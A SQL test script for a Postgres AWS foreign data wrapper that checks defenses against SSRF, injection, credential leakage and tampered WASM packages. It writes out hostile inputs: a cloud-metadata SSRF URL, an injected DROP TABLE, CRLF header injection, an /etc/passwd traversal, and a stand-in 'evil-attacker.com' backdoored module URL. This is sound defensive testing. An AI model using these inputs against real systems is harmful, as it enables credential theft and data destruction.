-- AWS FDW Advanced Security Tests
-- These tests verify protection against sophisticated attack vectors
-- Based on security analysis in SECURITY.md

-- ============================================================================
-- Setup
-- ============================================================================

DROP SERVER IF EXISTS ssrf_test_server CASCADE;
DROP SERVER IF EXISTS header_injection_server CASCADE;
DROP SCHEMA IF EXISTS sec_adv_test CASCADE;

CREATE EXTENSION IF NOT EXISTS wrappers;

-- ============================================================================
-- SECTION 1: SSRF (Server-Side Request Forgery) Tests
-- These are the MOST CRITICAL security tests
-- ============================================================================

SELECT '=== SECTION 1: SSRF Protection Tests ===' AS section;

-- SSRF-001: Block AWS metadata service (169.254.169.254)
SELECT 'SSRF-001: Block AWS metadata service IP' AS test;
DO $$
BEGIN
  CREATE SERVER ssrf_metadata_server
    FOREIGN DATA WRAPPER wasm_fdw_handler
    OPTIONS (
      fdw_package_url 'file:///path/to/aws_fdw.wasm',
      fdw_package_name 'supabase:aws-fdw',
      fdw_package_version '0.1.0',
      aws_access_key_id 'test',
      aws_secret_access_key 'test',
      region 'us-east-1',
      endpoint_url 'http://169.254.169.254/latest/meta-data/'
    );

  CREATE FOREIGN TABLE ssrf_test (data text)
  SERVER ssrf_metadata_server
  OPTIONS (service 's3', object 'buckets');

  PERFORM * FROM ssrf_test;
  RAISE EXCEPTION 'SSRF-001 FAILED: Metadata service should be blocked';
EXCEPTION
  WHEN OTHERS THEN
    IF SQLERRM LIKE '%blocked%' OR SQLERRM LIKE '%not allowed%' OR SQLERRM LIKE '%invalid%' THEN
      RAISE NOTICE 'SSRF-001 PASSED: Metadata IP blocked - %', SQLERRM;
    ELSE
      -- Even if error is different, as long as it failed it's somewhat protected
      RAISE NOTICE 'SSRF-001 PARTIAL: Request failed (verify blocking) - %', SQLERRM;
    END IF;
END $$;

-- SSRF-002: Block localhost (127.0.0.1)
SELECT 'SSRF-002: Block localhost IP' AS test;
DO $$
BEGIN
  CREATE SERVER ssrf_localhost_server
    FOREIGN DATA WRAPPER wasm_fdw_handler
    OPTIONS (
      fdw_package_url 'file:///path/to/aws_fdw.wasm',
      fdw_package_name 'supabase:aws-fdw',
      fdw_package_version '0.1.0',
      aws_access_key_id 'test',
      aws_secret_access_key 'test',
      region 'us-east-1',
      endpoint_url 'http://127.0.0.1:8080/admin'
    );

  CREATE FOREIGN TABLE ssrf_localhost (data text)
  SERVER ssrf_localhost_server
  OPTIONS (service 's3', object 'buckets');

  PERFORM * FROM ssrf_localhost;
  RAISE EXCEPTION 'SSRF-002 FAILED: Localhost should be blocked';
EXCEPTION
  WHEN OTHERS THEN
    RAISE NOTICE 'SSRF-002 INFO: Localhost request result - %', SQLERRM;
END $$;

-- SSRF-003: Block private network (10.x.x.x)
SELECT 'SSRF-003: Block private network 10.x.x.x' AS test;
DO $$
BEGIN
  CREATE SERVER ssrf_private10_server
    FOREIGN DATA WRAPPER wasm_fdw_handler
    OPTIONS (
      fdw_package_url 'file:///path/to/aws_fdw.wasm',
      fdw_package_name 'supabase:aws-fdw',
      fdw_package_version '0.1.0',
      aws_access_key_id 'test',
      aws_secret_access_key 'test',
      region 'us-east-1',
      endpoint_url 'http://10.0.0.1:3306/'
    );

  CREATE FOREIGN TABLE ssrf_private (data text)
  SERVER ssrf_private10_server
  OPTIONS (service 's3', object 'buckets');

  PERFORM * FROM ssrf_private;
  RAISE EXCEPTION 'SSRF-003 FAILED: Private IP should be blocked';
EXCEPTION
  WHEN OTHERS THEN
    RAISE NOTICE 'SSRF-003 INFO: Private IP request result - %', SQLERRM;
END $$;

-- SSRF-004: Block private network (192.168.x.x)
SELECT 'SSRF-004: Block private network 192.168.x.x' AS test;
DO $$
BEGIN
  CREATE SERVER ssrf_private192_server
    FOREIGN DATA WRAPPER wasm_fdw_handler
    OPTIONS (
      fdw_package_url 'file:///path/to/aws_fdw.wasm',
      fdw_package_name 'supabase:aws-fdw',
      fdw_package_version '0.1.0',
      aws_access_key_id 'test',
      aws_secret_access_key 'test',
      region 'us-east-1',
      endpoint_url 'http://192.168.1.1/'
    );

  CREATE FOREIGN TABLE ssrf_private192 (data text)
  SERVER ssrf_private192_server
  OPTIONS (service 's3', object 'buckets');

  PERFORM * FROM ssrf_private192;
  RAISE EXCEPTION 'SSRF-004 FAILED: Private IP should be blocked';
EXCEPTION
  WHEN OTHERS THEN
    RAISE NOTICE 'SSRF-004 INFO: Private IP request result - %', SQLERRM;
END $$;

-- ============================================================================
-- SECTION 2: Input Validation & Injection Tests
-- ============================================================================

SELECT '=== SECTION 2: Input Validation Tests ===' AS section;

-- INJ-001: SQL injection in bucket name
SELECT 'INJ-001: SQL injection attempt in bucket name' AS test;
DO $$
BEGIN
  CREATE SERVER inj_test_server
    FOREIGN DATA WRAPPER wasm_fdw_handler
    OPTIONS (
      fdw_package_url 'file:///path/to/aws_fdw.wasm',
      fdw_package_name 'supabase:aws-fdw',
      fdw_package_version '0.1.0',
      aws_access_key_id 'test',
      aws_secret_access_key 'test',
      region 'us-east-1',
      endpoint_url 'http://localstack:4566'
    );

  -- Attempt SQL injection via bucket name
  CREATE FOREIGN TABLE sql_inj_test (key text, size bigint)
  SERVER inj_test_server
  OPTIONS (
    service 's3',
    object 'objects'
  );

  -- The dangerous part is in the WHERE clause
  PERFORM * FROM sql_inj_test
  WHERE bucket = 'test''; DROP TABLE important_data; --';

  -- If we get here without disaster, the injection was neutralized
  RAISE NOTICE 'INJ-001 PASSED: SQL injection attempt neutralized';
EXCEPTION
  WHEN OTHERS THEN
    IF SQLERRM LIKE '%DROP%' THEN
      RAISE EXCEPTION 'INJ-001 FAILED: SQL injection may have executed!';
    ELSE
      RAISE NOTICE 'INJ-001 PASSED: Query failed safely - %', SQLERRM;
    END IF;
END $$;

-- INJ-002: Header injection attempt
SELECT 'INJ-002: HTTP header injection attempt' AS test;
DO $$
BEGIN
  CREATE FOREIGN TABLE header_inj_test (key text)
  SERVER inj_test_server
  OPTIONS (
    service 's3',
    object 'objects'
  );

  -- Attempt to inject HTTP headers via bucket name
  PERFORM * FROM header_inj_test
  WHERE bucket = E'test\r\nX-Injected-Header: evil\r\nX-Another: bad';

  RAISE NOTICE 'INJ-002 INFO: Header injection attempt processed';
EXCEPTION
  WHEN OTHERS THEN
    RAISE NOTICE 'INJ-002 INFO: Request failed - %', SQLERRM;
END $$;

-- INJ-003: Path traversal attempt
SELECT 'INJ-003: Path traversal attempt' AS test;
DO $$
BEGIN
  PERFORM * FROM header_inj_test
  WHERE bucket = '../../../etc/passwd';

  RAISE NOTICE 'INJ-003 INFO: Path traversal attempt processed (S3 treats as literal key)';
EXCEPTION
  WHEN OTHERS THEN
    IF SQLERRM LIKE '%traversal%' OR SQLERRM LIKE '%invalid%' THEN
      RAISE NOTICE 'INJ-003 PASSED: Path traversal blocked - %', SQLERRM;
    ELSE
      RAISE NOTICE 'INJ-003 INFO: Request failed - %', SQLERRM;
    END IF;
END $$;

-- INJ-004: Null byte injection
SELECT 'INJ-004: Null byte injection attempt' AS test;
DO $$
BEGIN
  PERFORM * FROM header_inj_test
  WHERE bucket = E'test\x00malicious';

  RAISE NOTICE 'INJ-004 INFO: Null byte processed';
EXCEPTION
  WHEN OTHERS THEN
    RAISE NOTICE 'INJ-004 INFO: Request failed - %', SQLERRM;
END $$;

-- ============================================================================
-- SECTION 3: Credential Security Tests
-- ============================================================================

SELECT '=== SECTION 3: Credential Security Tests ===' AS section;

-- CRED-001: Verify credentials not in error messages
SELECT 'CRED-001: Credentials should not appear in errors' AS test;
DO $$
DECLARE
  secret_key TEXT := 'SuperSecretKey12345DoNotLeak';
  access_key TEXT := 'AKIATESTKEY12345678';
  error_msg TEXT;
BEGIN
  CREATE SERVER cred_test_server
    FOREIGN DATA WRAPPER wasm_fdw_handler
    OPTIONS (
      fdw_package_url 'file:///path/to/aws_fdw.wasm',
      fdw_package_name 'supabase:aws-fdw',
      fdw_package_version '0.1.0',
      aws_access_key_id 'AKIATESTKEY12345678',
      aws_secret_access_key 'SuperSecretKey12345DoNotLeak',
      region 'invalid-region-xyz',
      endpoint_url 'https://s3.invalid-region-xyz.amazonaws.com'
    );

  CREATE FOREIGN TABLE cred_leak_test (name text)
  SERVER cred_test_server
  OPTIONS (service 's3', object 'buckets');

  PERFORM * FROM cred_leak_test;
EXCEPTION
  WHEN OTHERS THEN
    error_msg := SQLERRM;
    IF error_msg LIKE '%SuperSecretKey%' THEN
      RAISE EXCEPTION 'CRED-001 FAILED: Secret key leaked in error: %', error_msg;
    ELSIF error_msg LIKE '%AKIATESTKEY%' THEN
      RAISE WARNING 'CRED-001 WARNING: Access key visible in error (less critical): %', error_msg;
    ELSE
      RAISE NOTICE 'CRED-001 PASSED: Credentials not in error message';
    END IF;
END $$;

-- ============================================================================
-- SECTION 4: DoS Protection Tests
-- ============================================================================

SELECT '=== SECTION 4: DoS Protection Tests ===' AS section;

-- DOS-001: Test timeout handling
SELECT 'DOS-001: HTTP timeout handling' AS test;
-- Note: This test would require a slow endpoint to properly test
-- For now we just document that timeout protection should exist
SELECT 'DOS-001 INFO: Timeout protection should be implemented in HTTP client' AS info;

-- DOS-002: Large response handling
SELECT 'DOS-002: Large response protection' AS test;
SELECT 'DOS-002 INFO: Response size limits should be implemented' AS info;

-- ============================================================================
-- SECTION 5: Supply Chain Security Tests
-- ============================================================================

SELECT '=== SECTION 5: Supply Chain Tests ===' AS section;

-- SUPPLY-001: Missing checksum should be rejected
-- This is the PRIMARY supply chain defense - checksum is REQUIRED
SELECT 'SUPPLY-001: Missing checksum must be rejected' AS test;
DO $$
BEGIN
  -- Attempt to create server WITHOUT checksum - this MUST fail
  CREATE SERVER no_checksum_server
    FOREIGN DATA WRAPPER wasm_fdw_handler
    OPTIONS (
      fdw_package_url 'file:///path/to/aws_fdw.wasm',
      fdw_package_name 'supabase:aws-fdw',
      fdw_package_version '0.1.0',
      aws_access_key_id 'test',
      aws_secret_access_key 'test',
      region 'us-east-1'
    );

  -- If we get here, the security control FAILED
  RAISE EXCEPTION 'SUPPLY-001 FAILED: Server created without checksum - CRITICAL SECURITY VULNERABILITY';
EXCEPTION
  WHEN OTHERS THEN
    IF SQLERRM LIKE '%fdw_package_checksum%' THEN
      RAISE NOTICE 'SUPPLY-001 PASSED: Missing checksum correctly rejected - %', SQLERRM;
    ELSE
      -- Any other error means we should investigate
      RAISE NOTICE 'SUPPLY-001 INFO: Server creation failed (verify checksum enforcement) - %', SQLERRM;
    END IF;
END $$;

-- SUPPLY-002: Invalid checksum should be rejected at load time
SELECT 'SUPPLY-002: Invalid checksum verification' AS test;
DO $$
BEGIN
  -- Create server with WRONG checksum
  CREATE SERVER bad_checksum_server
    FOREIGN DATA WRAPPER wasm_fdw_handler
    OPTIONS (
      fdw_package_url 'file:///path/to/aws_fdw.wasm',
      fdw_package_name 'supabase:aws-fdw',
      fdw_package_version '0.1.0',
      fdw_package_checksum 'sha256:0000000000000000000000000000000000000000000000000000000000000000',
      aws_access_key_id 'test',
      aws_secret_access_key 'test',
      region 'us-east-1'
    );

  -- Server creation might succeed, but query should fail on checksum mismatch
  CREATE FOREIGN TABLE checksum_test (name text)
  SERVER bad_checksum_server
  OPTIONS (service 's3', object 'buckets');

  PERFORM * FROM checksum_test;

  RAISE EXCEPTION 'SUPPLY-002 FAILED: Query succeeded with invalid checksum';
EXCEPTION
  WHEN OTHERS THEN
    IF SQLERRM LIKE '%checksum%' OR SQLERRM LIKE '%hash%' OR SQLERRM LIKE '%mismatch%' THEN
      RAISE NOTICE 'SUPPLY-002 PASSED: Invalid checksum rejected - %', SQLERRM;
    ELSE
      RAISE NOTICE 'SUPPLY-002 INFO: Request failed (verify checksum validation) - %', SQLERRM;
    END IF;
END $$;

-- SUPPLY-003: Malicious WASM URL with checksum still requires valid checksum
SELECT 'SUPPLY-003: Malicious URL with checksum requirement' AS test;
DO $$
BEGIN
  -- Even with a checksum, untrusted sources should be scrutinized
  CREATE SERVER malicious_wasm_server
    FOREIGN DATA WRAPPER wasm_fdw_handler
    OPTIONS (
      fdw_package_url 'https://evil-attacker.com/backdoored.wasm',
      fdw_package_name 'supabase:aws-fdw',
      fdw_package_version '0.1.0',
      fdw_package_checksum 'sha256:abcd1234abcd1234abcd1234abcd1234abcd1234abcd1234abcd1234abcd1234',
      aws_access_key_id 'test',
      aws_secret_access_key 'test',
      region 'us-east-1'
    );

  CREATE FOREIGN TABLE evil_test (name text)
  SERVER malicious_wasm_server
  OPTIONS (service 's3', object 'buckets');

  PERFORM * FROM evil_test;

  -- If download succeeds but checksum doesn't match, it should fail
  RAISE NOTICE 'SUPPLY-003 WARNING: Malicious URL was accessed - verify network controls';
EXCEPTION
  WHEN OTHERS THEN
    -- Expected: either network error or checksum mismatch
    RAISE NOTICE 'SUPPLY-003 PASSED: Malicious WASM load failed - %', SQLERRM;
END $$;

-- ============================================================================
-- SECTION 6: Authorization Boundary Tests
-- ============================================================================

SELECT '=== SECTION 6: Authorization Tests ===' AS section;

-- AUTH-001: Cross-user server access
SELECT 'AUTH-001: Foreign server access control' AS test;
-- This relies on PostgreSQL's GRANT/REVOKE system
-- Document that proper permissions must be set
SELECT 'AUTH-001 INFO: Verify USAGE on foreign servers is properly restricted' AS info;
SELECT 'AUTH-001 INFO: Run: REVOKE ALL ON FOREIGN SERVER aws_server FROM PUBLIC;' AS recommendation;

-- ============================================================================
-- SECTION 7: Data Exfiltration Tests
-- ============================================================================

SELECT '=== SECTION 7: Data Exfiltration Prevention ===' AS section;

-- EXFIL-001: Verify no write operations
SELECT 'EXFIL-001: Confirm write operations blocked' AS test;
-- These are covered in test_security.sql (SEC-030, SEC-031, SEC-032)
SELECT 'EXFIL-001 INFO: INSERT/UPDATE/DELETE should return "not supported" error' AS info;

-- ============================================================================
-- Cleanup
-- ============================================================================

DROP SERVER IF EXISTS ssrf_metadata_server CASCADE;
DROP SERVER IF EXISTS ssrf_localhost_server CASCADE;
DROP SERVER IF EXISTS ssrf_private10_server CASCADE;
DROP SERVER IF EXISTS ssrf_private192_server CASCADE;
DROP SERVER IF EXISTS inj_test_server CASCADE;
DROP SERVER IF EXISTS cred_test_server CASCADE;
DROP SERVER IF EXISTS no_checksum_server CASCADE;
DROP SERVER IF EXISTS bad_checksum_server CASCADE;
DROP SERVER IF EXISTS malicious_wasm_server CASCADE;

SELECT '=== Advanced Security Tests Complete ===' AS status;
SELECT 'IMPORTANT: Review any FAILED or WARNING results above' AS note;
SELECT 'IMPORTANT: Some tests may show INFO - manual verification required' AS note2;
